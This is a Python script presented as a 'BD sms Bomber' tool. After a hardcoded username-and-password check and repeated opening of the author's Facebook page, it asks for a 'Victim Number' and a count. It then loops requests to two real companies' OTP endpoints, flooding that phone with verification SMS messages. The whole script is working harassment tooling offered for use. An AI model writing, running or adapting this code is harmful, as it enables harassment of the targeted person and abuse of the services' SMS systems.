import os,sys,time,datetime
import requests
bl="\33[94m"
re="\033[91m"
li="\033[94m"
w="\33[97m"
y="\33[93m"
g="\033[1;32m"
cy="\033[96m"
end="\033[0m"



os.system('clear')
info="""    ╔===================================================╗
    ║ [•] Author   => MD ANISUR RAHMAN                 ║
    ║ [•] Tool     => BD sms Bomber                     ║
    ║ [•] GitHub=https://www.github.com/anisur143 ║
    ║ [•] whatsapp= 01942992904            ║
    ╚===================================================╝
"""
os.system("xdg-open https://www.facebook.com/anisur.rahman.bro ")
os.system("lolcat login.txt")
print(y+info)

name='ANISUR'
password='anisur143'

usr=str(input(cy+"Username => "))
print("  ")
pas=str(input(g+"Password => "))

if name==usr and password==pas:
  print(g+"Login Successful ☑️")
  time.sleep(2)
  os.system('clear')
  
  pass 

else:
  print(re+"[×] Wrong Username or Password try agin ")
  os.system("xdg-open https://www.facebook.com/anisur.rahman.bro"),
  sys.exit()

 

logo="""
     ___   _   _  _____  _____  _   _ ______ 
  / _ \ | \ | ||_   _|/  ___|| | | || ___ \
 / /_\ \|  \| |  | |  \ `--. | | | || |_/ /
 |  _  || . ` |  | |   `--. \| | | ||    / 
 | | | || |\  | _| |_ /\__/ /| |_| || |\ \ 
 \_| |_/\_| \_/ \___/ \____/  \___/ \_| \_|
                                           
                😈 ANISUR😈
================================================================                                                      
"""
os.system("xdg-open https://www.facebook.com/anisur.rahman.bro")
print(cy+logo)

print(w+"["+re+" 1."+w+"]"+g+"START" " " +cy+"BOM"+li+"BING  ")
print(g)
print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")

inp=str(input(g+"Enter"  +re+" Your"  +g+" Choice"+w+" => "))
if inp=="2":
        print("\n          ♥️♥️Thanks For Using My Tobol♥️♥️"),
        os.system("xdg-open https://www.facebook.com/anisur.rahman.bro"),
        time.sleep(1),
        exit()
        
        

elif inp=='1':
  time.sleep(2)
  os.system('clear')
  print(cy+logo),
  
  number=str(input(g+"\n Enter your Victim Number"+cy+"(without"+w+" +88 ) => "))
  
  amount=int(input(g+"        Enter amount =>  "))
else:
  print (re+"\n • Invalid Choice• \n • Try again •"),
  exit()
  pass
  
api="https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"
url="https://ss.binge.buzz/otp/send/login"

data={'phone':number}
  
for i in range(amount):
  requests.get(api)
  requests.post(url,data=data)
  
  print(str(i+1)+" Send Successfully ☑️")
  
